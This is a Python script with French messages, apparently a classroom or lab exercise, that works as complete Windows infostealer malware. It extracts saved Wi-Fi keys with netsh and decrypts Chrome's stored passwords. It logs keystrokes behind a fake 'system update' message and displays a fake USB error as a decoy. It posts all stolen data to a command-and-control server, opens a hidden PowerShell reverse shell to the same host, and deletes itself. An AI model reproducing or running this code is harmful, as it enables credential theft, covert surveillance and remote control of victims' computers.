import subprocess
import sqlite3
import os
import requests
import time
import random
import json
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import win32crypt
from pynput.keyboard import Listener

def extract_wifi_creds():
    try:
        print("Lancement de netsh wlan show profiles avec admin...")
        profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, stderr=subprocess.STDOUT)
        print("Sortie netsh profiles:", profiles_output)
        wifi_data = {}
        current_profile = None
        for line in profiles_output.split('\n'):
            line = line.strip()
            if line.startswith("All User Profile"):
                current_profile = line.split(':')[1].strip()
                print(f"Profil detecte: {current_profile}")
                try:
                    print(f"Essai d'extraction pour {current_profile}...")
                    details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'name="' + current_profile + '"', 'key=clear'], text=True, stderr=subprocess.STDOUT)
                    print("Sortie netsh details:", details)
                    for detail in details.split('\n'):
                        if "Key Content" in detail:
                            key_value = detail.split(':')[1].strip()
                            if key_value:
                                wifi_data[current_profile] = key_value
                                print(f"Clé trouvee: {current_profile}: {key_value}")
                except subprocess.CalledProcessError as e:
                    print(f"Erreur pour {current_profile}: {e.output}")
        return wifi_data if wifi_data else {"note": "Aucun mot de passe WiFi trouve ou acces refuse (admin requis)"}
    except subprocess.CalledProcessError as e:
        return {"error": f"Commande netsh echouee: {e.output}"}
    except Exception as e:
        return {"error": f"Erreur inattendue: {e}"}
def extract_browser_creds():
    try:
        local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key_encoded = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key_encoded = master_key_encoded[5:]
        master_key = win32crypt.CryptUnprotectData(master_key_encoded, None, None, None, 0)[1]

        chrome_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
        if not os.path.exists(chrome_db):
            return [{"error": "Chrome DB not found"}]
        temp_db = os.path.expanduser(r'~\AppData\Local\Temp\LoginData.db')
        os.system(f'copy "{chrome_db}" "{temp_db}"')
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        credentials = []
        for row in cursor.fetchall():
            url, username, encrypted_pass = row
            if not encrypted_pass:
                continue
            try:
                if encrypted_pass.startswith(b'v10') or encrypted_pass.startswith(b'v11'):
                    iv = encrypted_pass[3:15]
                    payload = encrypted_pass[15:-16]
                    tag = encrypted_pass[-16:]
                    cipher = AESGCM(master_key)
                    password = cipher.decrypt(iv, payload, tag).decode('utf-8')
                else:
                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                credentials.append({"url": url, "username": username, "password": password})
            except:
                continue
        conn.close()
        os.remove(temp_db)
        return credentials
    except:
        return [{"error": "Browser extraction failed"}]

def capture_keystrokes(duration=60):
    keys = []
    def on_press(key):
        try:
            keys.append(key.char if hasattr(key, 'char') else f"[{str(key)}]")
        except:
            pass
    with Listener(on_press=on_press) as listener:
        print("Mise à jour du systeme en cours, veuillez patienter...")
        time.sleep(duration)
        listener.stop()
    return ' '.join(keys)

def send_to_c2(data):
    c2_url = "http://192.168.2.154:8080"
    try:
        requests.post(c2_url, json=data, timeout=10)
    except:
        pass

def open_reverse_shell():
    try:
        ps_command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.2.154", 4444);' + \
                    '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;' + \
                    '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );' + \
                    '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        subprocess.Popen(['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-Exec', 'Bypass', ps_command])
    except:
        pass

if __name__ == "__main__":
    try:
        time.sleep(random.randint(1, 10))
        print("Erreur USB detectee - Veuillez retirer et reinserer la cle.")
        wifi_data = extract_wifi_creds()
        browser_data = extract_browser_creds()
        keys_logged = capture_keystrokes()
        payload = {"wifi": wifi_data, "browser": browser_data, "keys": keys_logged, "matricules": "2315529", "victim_ip": "192.168.2.140"}
        send_to_c2(payload)
        open_reverse_shell()
        try:
            os.remove(__file__)
        except:
            pass
    except Exception as e:
        print(f"Erreur lors de l'execution : {e}")
